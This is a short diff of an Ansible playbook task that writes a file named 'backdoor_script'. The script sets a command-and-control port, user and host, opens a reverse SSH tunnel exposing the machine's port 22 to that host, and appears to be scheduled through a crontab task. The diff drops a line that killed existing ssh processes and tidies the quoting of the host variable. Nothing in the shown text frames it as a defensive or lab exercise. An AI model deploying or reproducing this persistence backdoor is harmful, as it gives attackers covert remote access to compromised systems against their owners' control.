@@ -10,11 +10,10 @@
             file: path={{ backdoor_script }} state=touch
           - name: createscript
             shell: |
-                echo "killall ssh > /dev/null 2>&1" > {{ backdoor_script }}
                 echo "sleep 5" >> {{ backdoor_script }}
                 echo "REMLIS={{ cnc_port }}" >> {{ backdoor_script }}
                 echo "REMUSER={{ cnc_user }}" >> {{ backdoor_script }}
-                echo "HOSTS=\"{{ cnc_fqdn }} \"" >> {{ backdoor_script }}
+                echo "HOSTS=\"{{ cnc_fqdn }}\"" >> {{ backdoor_script }}
                 echo "ssh -R \${REMLIS}:localhost:22 -N \${HOSTS} -l \${REMUSER}" >> {{ backdoor_script }}
                 chmod 755 {{ backdoor_script }}
           - name: crontab
